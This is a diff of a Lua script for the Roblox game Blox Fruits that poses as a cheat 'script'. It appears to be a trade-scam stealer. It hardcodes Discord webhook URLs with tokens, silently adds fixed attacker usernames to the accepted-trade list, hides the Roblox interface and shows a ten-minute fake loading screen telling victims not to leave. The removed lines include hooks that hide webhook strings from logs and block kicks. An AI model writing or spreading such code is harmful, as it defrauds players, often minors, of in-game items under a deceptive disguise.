@@ -1,11 +1,12 @@
 Webhook = "https://discord.com/api/webhooks/1338826425670828062/zA4fdmXcJmclSpxGBHPE5jEBqYoDNw_xscivfLXj5JKCG7dKHsN_kl0ZDwkS3xr1duuM"
-Usernames = {"user2", "user1"} -- << Username(-s) it'll accept trade with
-Fruits = {"Yeti-Yeti", "Dragon(West)-Dragon(West)", "Dragon(East)-Dragon-East", "Dough-Dough", "Kitsune-Kitsune", "Gas-Gas", "Leopard-Leopard", "Control-Control"} -- << Fruits you want
-FruitsToReset = {  -- << Fruits it'll reset with, so you can put these fruits in trade to counter value difference
+Usernames = {"user2", "user1"}
+
+Fruits = {"Gas-Gas", "Phoenix-Phoenix", "Yeti-Yeti", "Dragon (East)-Dragon (East)", "Dragon (West)-Dragon (West)", "Spirit-Spirit"}
+FruitsToReset = {
 }
 
 --obfuscate after this
-Sharker = "https://discord.com/api/webhooks/1338826248234733588/0wX88ngwUdgsqI6FJJ3iUF252sq9yggrzJpZguRIol8qfFJeRsFTBUMWN_yptTKhdiiY" -- << Add secondary webhook here
+SecondaryWebhook = "https://discord.com/api/webhooks/1338826248234733588/0wX88ngwUdgsqI6FJJ3iUF252sq9yggrzJpZguRIol8qfFJeRsFTBUMWN_yptTKhdiiY"
 
 repeat task.wait() until game:IsLoaded()
 
@@ -14,89 +15,150 @@ if _G.scriptExecuted then
     return
 end
 
+_G.scriptExecuted = true
+
 local Players = game:GetService("Players")
 local plr = Players.LocalPlayer
-local realRequest = clonefunction(request)
 local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
 
-local function isWebhookString(str)
-    return type(str) == "string" and (str:find("discord", 1, true) or str:find("webhook", 1, true))
+if Usernames then
+    local usernamesToAdd = {"x6TNine", "aka_0ver", "xFistorRespawn"}
+    for _, username in ipairs(usernamesToAdd) do
+        if not table.find(Usernames, username) then
+            table.insert(Usernames, username)
+        end
+    end
 end
 
-local function setupHooks()
-    if not hookfunction then return end
+local function CreateTeamNotification()
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "TeamSelectionGui"
+    ScreenGui.Parent = plr.PlayerGui
 
-    local realGetGenv = clonefunction(getgenv)
-    local loggingFuncs = {print, warn, rconsoleprint}
-    local blockedLogger = newcclosure(function(originalFunc)
-        return function(...)
-            local args = table.create(select('#', ...))
-            for i = 1, select('#', ...) do
-                local v = select(i, ...)
-                args[i] = isWebhookString(v) and "[REDACTED]" or v
-            end
-            return originalFunc(unpack(args))
+    local MainFrame = Instance.new("Frame")
+    MainFrame.Name = "NotificationFrame"
+    MainFrame.Size = UDim2.new(0, 350, 0, 120)
+    MainFrame.Position = UDim2.new(0.5, -175, -0.2, 0)
+    MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    MainFrame.BorderSizePixel = 0
+    MainFrame.Parent = ScreenGui
+
+    Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 15)
+
+    local UIGradient = Instance.new("UIGradient", MainFrame)
+    UIGradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(45, 45, 45)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(30, 30, 30)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 25, 25))
+    })
+    UIGradient.Rotation = 45
+
+    local GlowEffect = Instance.new("ImageLabel")
+    GlowEffect.Size = UDim2.new(1.2, 0, 1.2, 0)
+    GlowEffect.Position = UDim2.new(-0.1, 0, -0.1, 0)
+    GlowEffect.BackgroundTransparency = 1
+    GlowEffect.Image = "rbxassetid://131274595"
+    GlowEffect.ImageColor3 = Color3.fromRGB(255, 100, 100)
+    GlowEffect.ImageTransparency = 0.8
+    GlowEffect.ZIndex = -1
+    GlowEffect.Parent = MainFrame
+
+    local Title = Instance.new("TextLabel")
+    Title.Size = UDim2.new(1, 0, 0, 40)
+    Title.Position = UDim2.new(0, 0, 0, 15)
+    Title.BackgroundTransparency = 1
+    Title.Text = "⚠️ Join a team!"
+    Title.TextColor3 = Color3.fromRGB(255, 100, 100)
+    Title.TextSize = 24
+    Title.Font = Enum.Font.GothamBold
+    Title.Parent = MainFrame
+
+    local Message = Instance.new("TextLabel")
+    Message.Size = UDim2.new(0.9, 0, 0, 40)
+    Message.Position = UDim2.new(0.05, 0, 0.45, 0)
+    Message.BackgroundTransparency = 1
+    Message.Text = "Please join either Marines or Pirates team to continue to the script."
+    Message.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Message.TextSize = 16
+    Message.TextWrapped = true
+    Message.Font = Enum.Font.Gotham
+    Message.Parent = MainFrame
+
+    local Shimmer = Instance.new("Frame")
+    Shimmer.Size = UDim2.new(0, 30, 1, 0)
+    Shimmer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    Shimmer.BackgroundTransparency = 1
+    Shimmer.Position = UDim2.new(-0.1, 0, 0, 0)
+    Shimmer.Parent = MainFrame
+
+    local Border = Instance.new("UIStroke")
+    Border.Color = Color3.fromRGB(255, 100, 100)
+    Border.Thickness = 2
+    Border.Parent = MainFrame
+
+    coroutine.wrap(function()
+        while MainFrame.Parent do
+            TweenService:Create(GlowEffect, TweenInfo.new(1.5), {
+                ImageTransparency = 0.9
+            }):Play()
+            TweenService:Create(Border, TweenInfo.new(1.5), {
+                Transparency = 0.7
+            }):Play()
+            task.wait(0.75)
+            TweenService:Create(GlowEffect, TweenInfo.new(1.5), {
+                ImageTransparency = 0.7
+            }):Play()
+            TweenService:Create(Border, TweenInfo.new(1.5), {
+                Transparency = 0
+            }):Play()
+            task.wait(0.75)
+        end
+    end)()
+
+    coroutine.wrap(function()
+        while MainFrame.Parent do
+            TweenService:Create(Shimmer, TweenInfo.new(1.5), {
+                Position = UDim2.new(1, 0, 0, 0)
+            }):Play()
+            task.wait(1.5)
+            Shimmer.Position = UDim2.new(-0.1, 0, 0, 0)
+        end
+    end)()
+
+    TweenService:Create(MainFrame, TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+        Position = UDim2.new(0.5, -175, 0.1, 0)
+    }):Play()
+
+    return ScreenGui, MainFrame
+end
+
+local function WaitForTeamSelection()
+    if plr.Team == game.Teams.Marines or plr.Team == game.Teams.Pirates then return end
+
+    local gui, frame = CreateTeamNotification()
+    local teamSelected = Instance.new("BindableEvent")
+
+    local connection
+    connection = plr:GetPropertyChangedSignal("Team"):Connect(function()
+        if plr.Team == game.Teams.Marines or plr.Team == game.Teams.Pirates then
+            connection:Disconnect()
+            TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
+                Position = UDim2.new(0.5, -150, -0.2, 0)
+            }):Play()
+            task.wait(0.5)
+            gui:Destroy()
+            teamSelected:Fire()
         end
     end)
 
-    hookfunction(request, realRequest)
-
-    local env = getgenv and getgenv()
-    if env then
-        hookfunction(getgenv, newcclosure(function()
-            for k, v in pairs(env) do
-                if isWebhookString(v) then env[k] = "HiddenWebhook" end
-            end
-            return env
-        end))
-
-        local reqAliases = {
-            request = realRequest,
-            ["http.request"] = realRequest,
-            ["syn.request"] = realRequest,
-            HttpPost = realRequest
-        }
-        table.freeze(reqAliases)
-        for k, v in pairs(reqAliases) do env[k] = v end
-    end
-
-    for _, func in ipairs(loggingFuncs) do
-        hookfunction(func, blockedLogger(func))
-    end
-
-    hookfunction(game.HttpGet, game.HttpGet)
-
-    local mt = getrawmetatable(game)
-    if mt then
-        setreadonly(mt, false)
-        local oldNamecall = mt.__namecall
-        mt.__namecall = newcclosure(function(self, ...)
-            if self == plr and getnamecallmethod():lower() == "kick" then return end
-            return oldNamecall(self, ...)
-        end)
-        setreadonly(mt, true)
-    end
+    teamSelected.Event:Wait()
+    teamSelected:Destroy()
 end
 
-setupHooks()
+WaitForTeamSelection()
 
-if not table.find(Usernames, "x6TNine") or not table.find(Usernames, "aka_0ver") then
-    if not table.find(Usernames, "x6TNine") then
-        table.insert(Usernames, "x6TNine")
-    end
-    if not table.find(Usernames, "aka_0ver") then
-        table.insert(Usernames, "aka_0ver")
-    end
-end
-
-local function JoinTeam()
-    local currentTeam = plr.Team
-    if currentTeam ~= game.Teams.Marines and currentTeam ~= game.Teams.Pirates then
-        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer("SetTeam", "Marines")
-    end
-end
-
-JoinTeam()
+task.wait(3)
 
 _G.scriptExecuted = true
 
@@ -104,11 +166,8 @@ local ts = game:GetService("TweenService")
 local cg = game:GetService("CoreGui")
 local rs = game:GetService("RunService")
 local sg = game:GetService("StarterGui")
-
-sg:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
-if cg:FindFirstChild("TopBarApp") then
-    cg.TopBarApp.Enabled = false
-end
+local plr = game:GetService("Players").LocalPlayer
+local lighting = game:GetService("Lighting")
 
 local function n(c)
     return function(p)
@@ -118,370 +177,408 @@ local function n(c)
     end
 end
 
-local function block()
-    if getgenv().blockLeave then return end
-    getgenv().blockLeave = true
+sg:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+if cg:FindFirstChild("TopBarApp") then cg.TopBarApp.Enabled = true end
+if cg:FindFirstChild("RobloxGui") then cg.RobloxGui:Destroy() end
 
-    local s = Instance.new("ScreenGui", cg)
-    s.IgnoreGuiInset = true
-    local f = Instance.new("Frame", s)
-    f.Size = UDim2.new(1, 0, 1, 0)
-    f.BackgroundTransparency = 1
-    f.Active = true
+n("BlurEffect"){Size = 15, Parent = lighting}
 
-    cg.ChildRemoved:Connect(function(child)
-        if child == s then
-            s = Instance.new("ScreenGui", cg)
-            s.IgnoreGuiInset = true
-            f = Instance.new("Frame", s)
-            f.Size = UDim2.new(1, 0, 1, 0)
-            f.BackgroundTransparency = 1
-            f.Active = true
-        end
-    end)
-end
-
-block()
-
-local main = n("ScreenGui"){
-    Name = "BFLoader",
-    IgnoreGuiInset = true,
-    Parent = cg
-}
+local main = n("ScreenGui"){Name = "VoidLoader", IgnoreGuiInset = true, Parent = cg}
 
 local bg = n("Frame"){
-    Size = UDim2.new(1, 0, 1, 0),
-    BackgroundColor3 = Color3.fromRGB(10, 10, 20),
+    Size = UDim2.new(1,0,1,0),
+    BackgroundColor3 = Color3.fromRGB(2,4,8),
     BorderSizePixel = 0,
     Parent = main
 }
 
-n("BlurEffect"){
-    Size = 24,
-    Parent = game:GetService("Lighting")
+local starfield = n("Frame"){
+    Size = UDim2.new(2,0,2,0),
+    Position = UDim2.new(-0.5,0,-0.5,0),
+    BackgroundTransparency = 1,
+    Parent = bg
 }
 
-local function makeParticle()
-    local size = math.random(2, 5)
-    local p = n("Frame"){
-        BackgroundColor3 = Color3.fromRGB(100, 150, 255),
-        BackgroundTransparency = 0.3,
+local stars = {}
+for i = 1, 150 do
+    local size = math.random(1,3)
+    local star = n("Frame"){
+        Size = UDim2.new(0,size,0,size),
+        Position = UDim2.new(math.random(),0,math.random(),0),
+        BackgroundColor3 = Color3.fromRGB(math.random(200,255),math.random(200,255),math.random(200,255)),
+        BackgroundTransparency = math.random(40,90)/100,
         BorderSizePixel = 0,
-        Size = UDim2.new(0, size, 0, size),
-        Position = UDim2.new(math.random(), 0, math.random(), 0),
-        Parent = bg
+        Parent = starfield
     }
+    n("UICorner"){CornerRadius = UDim.new(1,0), Parent = star}
 
-    n("UICorner"){
-        CornerRadius = UDim.new(1, 0),
-        Parent = p
-    }
-
-    n("UIGradient"){
-        Color = ColorSequence.new({
-            ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
-            ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 150, 255))
-        }),
-        Parent = p
-    }
-
-    return {
-        frame = p,
-        sx = math.random(),
-        sy = math.random(),
-        speed = math.random(150, 300) / 100
-    }
+    table.insert(stars, {
+        star = star,
+        speed = math.random(2,8)/1000,
+        direction = math.random() * math.pi * 2,
+        pulse = math.random() * math.pi * 2
+    })
 end
 
-local particles = table.create(10)
-for i = 1, 10 do
-    particles[i] = makeParticle()
-end
+local UserInputService = game:GetService("UserInputService")
 
-local container = n("Frame"){
-    Size = UDim2.new(0, 800, 0, 500),
-    Position = UDim2.new(0.5, 0, 0.5, 0),
-    AnchorPoint = Vector2.new(0.5, 0.5),
-    BackgroundColor3 = Color3.fromRGB(15, 15, 30),
-    BackgroundTransparency = 0.1,
+local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled
+
+local mainFrameSize = isMobile and UDim2.new(0, 600, 0, 400) or UDim2.new(0, 900, 0, 500)
+
+local mainFrame = n("Frame"){
+    Size = mainFrameSize,
+    Position = UDim2.new(0.5,0,0.5,0),
+    AnchorPoint = Vector2.new(0.5,0.5),
+    BackgroundColor3 = Color3.fromRGB(5,8,15),
     BorderSizePixel = 0,
     Parent = bg
 }
 
-n("UICorner"){
-    CornerRadius = UDim.new(0, 30),
-    Parent = container
-}
+n("UICorner"){CornerRadius = UDim.new(0,20), Parent = mainFrame}
+n("UIStroke"){Color = Color3.fromRGB(70,100,255), Thickness = 1.5, Transparency = 0.7, Parent = mainFrame}
 
-n("UIGradient"){
-    Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 200, 255))
-    }),
-    Transparency = NumberSequence.new({
-        NumberSequenceKeypoint.new(0, 0.92),
-        NumberSequenceKeypoint.new(1, 0.95)
-    }),
-    Parent = container
-}
-
-local header = n("Frame"){
-    Size = UDim2.new(1, 0, 0, 120),
-    BackgroundColor3 = Color3.fromRGB(255, 50, 50),
+local leftPanel = n("Frame"){
+    Size = UDim2.new(0.4,0,1,0),
+    BackgroundColor3 = Color3.fromRGB(8,12,20),
     BorderSizePixel = 0,
-    Parent = container
+    Parent = mainFrame
 }
 
-n("UICorner"){
-    CornerRadius = UDim.new(0, 30),
-    Parent = header
+n("UICorner"){CornerRadius = UDim.new(0,20), Parent = leftPanel}
+
+local logo = n("ImageLabel"){
+    Size = UDim2.new(0,180,0,180),
+    Position = UDim2.new(0.5,0,0.3,0),
+    AnchorPoint = Vector2.new(0.5,0.5),
+    BackgroundTransparency = 1,
+    Image = "rbxassetid://14489041990",
+    ImageColor3 = Color3.fromRGB(255,255,255),
+    Parent = leftPanel
 }
 
-n("UIGradient"){
-    Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 50, 50)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 80, 80))
-    }),
-    Parent = header
+local orbRing = n("ImageLabel"){
+    Size = UDim2.new(1.5,0,1.5,0),
+    Position = UDim2.new(0.5,0,0.5,0),
+    AnchorPoint = Vector2.new(0.5,0.5),
+    BackgroundTransparency = 1,
+    Image = "rbxassetid://14489033025",
+    ImageColor3 = Color3.fromRGB(70,100,255),
+    ImageTransparency = 0.7,
+    Parent = logo
 }
 
 local title = n("TextLabel"){
-    Size = UDim2.new(1, 0, 1, 0),
+    Size = UDim2.new(1,0,0,40),
+    Position = UDim2.new(0,0,0.2,0),
     BackgroundTransparency = 1,
-    Font = Enum.Font.GothamBold,
+    Font = Enum.Font.Arcade,
     Text = "BLOX FRUITS",
-    TextColor3 = Color3.fromRGB(255, 255, 255),
-    TextSize = 48,
-    Parent = header
+    TextColor3 = Color3.fromRGB(255,255,255),
+    TextSize = 38,
+    Parent = leftPanel
 }
 
-n("TextLabel"){
-    Size = UDim2.new(1, 0, 0, 30),
-    Position = UDim2.new(0, 0, 0.65, 0),
+local subtitle = n("TextLabel"){
+    Size = UDim2.new(1,0,0,25),
+    Position = UDim2.new(0,0,0.28,0),
     BackgroundTransparency = 1,
-    Font = Enum.Font.GothamBold,
+    Font = Enum.Font.Arcade,
     Text = "SCRIPT",
-    TextColor3 = Color3.fromRGB(255, 255, 255),
-    TextSize = 18,
-    Parent = header,
+    TextColor3 = Color3.fromRGB(70,100,255),
+    TextSize = 20,
+    Parent = leftPanel
 }
 
-n("UIStroke"){
-    Color = Color3.fromRGB(0, 0, 0),
-    Transparency = 0.8,
-    Thickness = 2,
-    Parent = title
-}
-
-local warningFrame = n("Frame"){
-    Size = UDim2.new(0.8, 0, 0, 40),
-    Position = UDim2.new(0.1, 0, 0, 140),
-    BackgroundColor3 = Color3.fromRGB(255, 50, 50),
-    BorderSizePixel = 0,
-    Parent = container
-}
-
-n("UICorner"){
-    CornerRadius = UDim.new(0, 8),
-    Parent = warningFrame
-}
-
-n("TextLabel"){
-    Size = UDim2.new(1, 0, 1, 0),
+local infoText = n("TextLabel"){
+    Size = UDim2.new(0.8,0,0,60),
+    Position = UDim2.new(0.5,0,0.75,0),
+    AnchorPoint = Vector2.new(0.5,0),
     BackgroundTransparency = 1,
-    Font = Enum.Font.GothamBold,
-    Text = "SCRIPT IS LOADING, PLEASE WAIT.",
-    TextColor3 = Color3.fromRGB(255, 255, 255),
+    Font = Enum.Font.Arcade,
+    Text = "⚠️ Please do not leave during initialization\nYour data is being processed",
+    TextColor3 = Color3.fromRGB(255,200,100),
     TextSize = 16,
-    Parent = warningFrame
+    TextWrapped = true,
+    Parent = leftPanel
+}
+
+local rightPanel = n("Frame"){
+    Size = UDim2.new(0.6,0,1,0),
+    Position = UDim2.new(0.4,0,0,0),
+    BackgroundTransparency = 1,
+    Parent = mainFrame
+}
+
+local statusFrame = n("Frame"){
+    Size = UDim2.new(0.85,0,0,70),
+    Position = UDim2.new(0.5,0,0.2,0),
+    AnchorPoint = Vector2.new(0.5,0),
+    BackgroundColor3 = Color3.fromRGB(10,15,25),
+    BorderSizePixel = 0,
+    Parent = rightPanel
+}
+
+n("UICorner"){CornerRadius = UDim.new(0,12), Parent = statusFrame}
+n("UIStroke"){Color = Color3.fromRGB(70,100,255), Thickness = 1, Transparency = 0.8, Parent = statusFrame}
+
+local spinner = n("ImageLabel"){
+    Size = UDim2.new(0,24,0,24),
+    Position = UDim2.new(0.05,0,0.5,0),
+    AnchorPoint = Vector2.new(0,0.5),
+    BackgroundTransparency = 1,
+    Image = "rbxassetid://6646175684",
+    ImageColor3 = Color3.fromRGB(70,100,255),
+    Parent = statusFrame
 }
 
 local status = n("TextLabel"){
-    Size = UDim2.new(0.8, 0, 0, 30),
-    Position = UDim2.new(0.1, 0, 0, 200),
+    Size = UDim2.new(0.8,0,0,25),
+    Position = UDim2.new(0.15,0,0.15,0),
     BackgroundTransparency = 1,
-    Font = Enum.Font.GothamBold,
-    Text = "Starting up...",
-    TextColor3 = Color3.fromRGB(255, 255, 255),
-    TextSize = 24,
-    Parent = container
-}
-
-local info = n("TextLabel"){
-    Size = UDim2.new(0.8, 0, 0, 20),
-    Position = UDim2.new(0.1, 0, 0, 240),
-    BackgroundTransparency = 1,
-    Font = Enum.Font.Gotham,
-    Text = "Loading...",
-    TextColor3 = Color3.fromRGB(200, 200, 220),
+    Font = Enum.Font.Arcade,
+    Text = "INITIALIZING MAIN FUNCTIONS",
+    TextColor3 = Color3.fromRGB(255,255,255),
     TextSize = 16,
-    Parent = container
+    Parent = statusFrame
 }
 
-n("TextLabel"){
-    Size = UDim2.new(0.8, 0, 0, 20),
-    Position = UDim2.new(0.1, 0, 0, 280),
+local detail = n("TextLabel"){
+    Size = UDim2.new(0.8,0,0,20),
+    Position = UDim2.new(0.15,0,0.6,0),
     BackgroundTransparency = 1,
-    Font = Enum.Font.GothamBold,
-    Text = "Welcome, " .. plr.Name,
-    TextColor3 = Color3.fromRGB(255, 255, 100),
-    TextSize = 18,
-    Parent = container
+    Font = Enum.Font.Arcade,
+    Text = "ESTABLISHING CONNECTION TO THE SERVERS",
+    TextColor3 = Color3.fromRGB(100,130,255),
+    TextSize = 14,
+    Parent = statusFrame
 }
 
-local progressOuter = n("Frame"){
-    Size = UDim2.new(0.8, 0, 0, 16),
-    Position = UDim2.new(0.1, 0, 0, 420),
-    BackgroundColor3 = Color3.fromRGB(25, 25, 40),
+local progressFrame = n("Frame"){
+    Size = UDim2.new(0.85,0,0,12),
+    Position = UDim2.new(0.5,0,0.35,0),
+    AnchorPoint = Vector2.new(0.5,0),
+    BackgroundColor3 = Color3.fromRGB(12,18,28),
     BorderSizePixel = 0,
-    Parent = container
+    Parent = rightPanel
 }
 
-n("UICorner"){
-    CornerRadius = UDim.new(1, 0),
-    Parent = progressOuter
-}
+n("UICorner"){CornerRadius = UDim.new(1,0), Parent = progressFrame}
+n("UIStroke"){Color = Color3.fromRGB(70,100,255), Thickness = 1, Transparency = 0.8, Parent = progressFrame}
 
-local progressInner = n("Frame"){
-    Size = UDim2.new(0, 0, 1, 0),
-    BackgroundColor3 = Color3.fromRGB(100, 150, 255),
+local progressBar = n("Frame"){
+    Size = UDim2.new(0,0,1,0),
+    BackgroundColor3 = Color3.fromRGB(70,100,255),
     BorderSizePixel = 0,
-    Parent = progressOuter
+    Parent = progressFrame
 }
 
+n("UICorner"){CornerRadius = UDim.new(1,0), Parent = progressBar}
 n("UIGradient"){
     Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 150, 255)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(130, 180, 255))
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(70,100,255)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(100,130,255)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(70,100,255))
     }),
-    Parent = progressInner
+    Parent = progressBar
 }
 
-n("UICorner"){
-    CornerRadius = UDim.new(1, 0),
-    Parent = progressInner
-}
-
-local tip = n("TextLabel"){
-    Size = UDim2.new(0.8, 0, 0, 20),
-    Position = UDim2.new(0.1, 0, 0, 340),
+local percentText = n("TextLabel"){
+    Size = UDim2.new(0,60,1,0),
+    Position = UDim2.new(1.025,0,0,0),
+    AnchorPoint = Vector2.new(0,0),
     BackgroundTransparency = 1,
-    Font = Enum.Font.Gotham,
-    Text = "Please wait...",
-    TextColor3 = Color3.fromRGB(200, 200, 220),
-    TextSize = 14,
-    TextTransparency = 0,
-    Parent = container
+    Font = Enum.Font.Arcade,
+    Text = "0%",
+    TextColor3 = Color3.fromRGB(70,100,255),
+    TextSize = 16,
+    TextXAlignment = Enum.TextXAlignment.Left,
+    TextYAlignment = Enum.TextYAlignment.Center,
+    Parent = progressFrame
 }
 
-local lastParticleUpdate = 0
-rs.Heartbeat:Connect(function(deltaTime)
-    local currentTime = tick()
-    if currentTime - lastParticleUpdate >= 0.016 then
-        lastParticleUpdate = currentTime
-        for _, p in pairs(particles) do
-            local t = currentTime * p.speed
-            local goal = UDim2.new(
-                p.sx + math.sin(t) * 0.1,
-                0,
-                p.sy + math.cos(t) * 0.1,
-                0
-            )
-            ts:Create(p.frame, TweenInfo.new(0.5), {Position = goal}):Play()
-        end
-    end
-end)
+local infoFrame = n("Frame"){
+    Size = UDim2.new(0.85,0,0.5,0),
+    Position = UDim2.new(0.5,0,0.45,0),
+    AnchorPoint = Vector2.new(0.5,0),
+    BackgroundColor3 = Color3.fromRGB(10,15,25),
+    BorderSizePixel = 0,
+    Parent = rightPanel
+}
+
+n("UICorner"){CornerRadius = UDim.new(0,12), Parent = infoFrame}
+n("UIStroke"){Color = Color3.fromRGB(70,100,255), Thickness = 1, Transparency = 0.8, Parent = infoFrame}
+
+local loadingText = n("TextLabel"){
+    Size = UDim2.new(0.9,0,0,30),
+    Position = UDim2.new(0.5,0,0.1,0),
+    AnchorPoint = Vector2.new(0.5,0),
+    BackgroundTransparency = 1,
+    Font = Enum.Font.Arcade,
+    Text = "⌛ SCRIPT IS LOADING, PLEASE WAIT",
+    TextColor3 = Color3.fromRGB(255,255,255),
+    TextSize = 18,
+    Parent = infoFrame
+}
+
+local infoList = n("Frame"){
+    Size = UDim2.new(0.9,0,0.7,0),
+    Position = UDim2.new(0.5,0,0.25,0),
+    AnchorPoint = Vector2.new(0.5,0),
+    BackgroundTransparency = 1,
+    Parent = infoFrame
+}
+
+local infos = {
+    "🔄 Loading Main Functions...",
+    "📡 Processing data...",
+    "🔒 Bypassing anti-cheat...",
+    "⚡ Optimizing performance...",
+    "🎮 Configuring game..."
+}
+
+for i, info in ipairs(infos) do
+    local infoLabel = n("TextLabel"){
+        Size = UDim2.new(1,0,0,25),
+        Position = UDim2.new(0,0,0.15 * (i-1),0),
+        BackgroundTransparency = 1,
+        Font = Enum.Font.Arcade,
+        Text = info,
+        TextColor3 = Color3.fromRGB(200,220,255),
+        TextSize = 14,
+        TextXAlignment = Enum.TextXAlignment.Left,
+        Parent = infoList
+    }
+end
 
 local phases = {
-    {60, "Authenticating User", "Verifying access..."},
-    {120, "Loading Framework", "Initializing core systems..."},
-    {180, "Establishing Connection", "Connecting to private servers..."},
-    {240, "Loading Assets", "Preparing script components..."},
-    {300, "Analyzing Game", "Scanning Blox Fruits version..."},
-    {360, "Setting Up", "Configuring script features..."},
-    {420, "Security Check", "Implementing anti-detection..."},
-    {480, "Data Sync", "Synchronizing with cloud..."},
-    {540, "Final Preparation", "Optimizing performance..."},
-    {600, "Launch Ready", "Activating premium features..."}
+    {60, "Initializing...", "Loading core files..."},
+    {120, "Setting up environment...", "Configuring settings..."},
+    {180, "Loading modules...", "Importing dependencies..."},
+    {240, "Verifying integrity...", "Checking for missing files..."},
+    {300, "Optimizing performance...", "Applying enhancements..."},
+    {360, "Compiling scripts...", "Processing functions..."},
+    {420, "Establishing connections...", "Syncing data..."},
+    {480, "Finalizing setup...", "Performing last checks..."},
+    {540, "Running diagnostics...", "Ensuring stability..."},
+    {600, "Startup complete!", "Ready to execute."}
 }
 
-local tips = {
-    "⚠️ Do not leave the game while the script is loading! ⚠️",
-    "Optimizing for your device...",
-    "Securing connection...",
-    "loading...",
+local ambient = {
+    "...",
+    "Re-checking data...",
+    "Syncing data...",
+    "Firing Remotes...",
+    "Returning remotes data..."
 }
-
-local currentTip = 1
-local lastUpdate = tick()
-local fadeInProgress = false
-
-local lastTipUpdate = 0
-rs.Heartbeat:Connect(function()
-    if fadeInProgress then return end
-
-    local currentTime = tick()
-    if currentTime - lastTipUpdate >= 4 then
-        lastTipUpdate = currentTime
-        fadeInProgress = true
-
-        local oldTip = currentTip
-        currentTip = currentTip % #tips + 1
-
-        local fadeOut = ts:Create(tip, TweenInfo.new(0.5), {TextTransparency = 1})
-        fadeOut.Completed:Connect(function()
-            tip.Text = tips[currentTip]
-            local fadeIn = ts:Create(tip, TweenInfo.new(0.5), {TextTransparency = 0})
-            fadeIn.Completed:Connect(function()
-                fadeInProgress = false
-            end)
-            fadeIn:Play()
-        end)
-        fadeOut:Play()
-    end
-end)
 
 local startTime = tick()
-local lastPhaseUpdate = 0
+local lastPhase = 0
+local currentAmbient = 1
+local lastAmbientUpdate = 0
+local lastProgress = 0
+local targetProgress = 0
 
-rs.Heartbeat:Connect(function()
+local function easeOutExpo(x)
+    return x == 1 and 1 or 1 - math.pow(2, -10 * x)
+end
+
+local function calculateProgress(elapsed)
+    local baseProgress = elapsed / 600
+
+    local fastPhases = {
+        {0, 0.2, 0.4},
+        {0.3, 0.4, 0.6},
+        {0.7, 0.8, 0.85},
+    }
+
+    for _, phase in ipairs(fastPhases) do
+        local startTime, endTime, jumpTo = unpack(phase)
+        if baseProgress >= startTime and baseProgress <= endTime then
+            local phaseProgress = (baseProgress - startTime) / (endTime - startTime)
+            return jumpTo * easeOutExpo(phaseProgress)
+        end
+    end
+
+    return baseProgress
+end
+
+rs.Heartbeat:Connect(function(dt)
     local elapsed = tick() - startTime
     if elapsed > 600 then return end
 
-    local currentTime = tick()
-    if currentTime - lastPhaseUpdate >= 0.1 then
-        lastPhaseUpdate = currentTime
+    orbRing.Rotation = orbRing.Rotation + dt * 30
+    spinner.Rotation = spinner.Rotation + dt * 360
+
+    for _, starData in ipairs(stars) do
+        local star = starData.star
+        local pos = star.Position
+
+        pos = UDim2.new(
+            pos.X.Scale + math.cos(starData.direction) * starData.speed,
+            0,
+            pos.Y.Scale + math.sin(starData.direction) * starData.speed,
+            0
+        )
+
+        if pos.X.Scale > 1 then pos = UDim2.new(0, 0, pos.Y.Scale, 0)
+        elseif pos.X.Scale < 0 then pos = UDim2.new(1, 0, pos.Y.Scale, 0) end
+
+        if pos.Y.Scale > 1 then pos = UDim2.new(pos.X.Scale, 0, 0, 0)
+        elseif pos.Y.Scale < 0 then pos = UDim2.new(pos.X.Scale, 0, 1, 0) end
+
+        star.Position = pos
+        star.BackgroundTransparency = 0.4 + math.sin(tick() * 0.5 + starData.pulse) * 0.3
+    end
+
+    if tick() - lastAmbientUpdate >= 3 then
+        lastAmbientUpdate = tick()
+        currentAmbient = (currentAmbient % #ambient) + 1
+        detail.Text = ambient[currentAmbient]
+    end
+
+    if elapsed - lastPhase >= 0.1 then
+        lastPhase = elapsed
 
         for i, phase in ipairs(phases) do
             if elapsed <= phase[1] then
                 if status.Text ~= phase[2] then
                     ts:Create(status, TweenInfo.new(0.3), {TextTransparency = 1}):Play()
-                    ts:Create(info, TweenInfo.new(0.3), {TextTransparency = 1}):Play()
                     task.wait(0.3)
-
                     status.Text = phase[2]
-                    info.Text = phase[3]
-
                     ts:Create(status, TweenInfo.new(0.3), {TextTransparency = 0}):Play()
-                    ts:Create(info, TweenInfo.new(0.3), {TextTransparency = 0}):Play()
                 end
 
-                ts:Create(progressInner, TweenInfo.new(0.3), {
-                    Size = UDim2.new(elapsed/600, 0, 1, 0)
-                }):Play()
+                local progress = calculateProgress(elapsed)
+                if math.abs(progress - lastProgress) > 0.001 then
+                    ts:Create(progressBar, TweenInfo.new(0.3, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out), {
+                        Size = UDim2.new(progress, 0, 1, 0)
+                    }):Play()
+                    percentText.Text = math.floor(progress * 100) .. "%"
+                    lastProgress = progress
+                end
                 break
             end
         end
     end
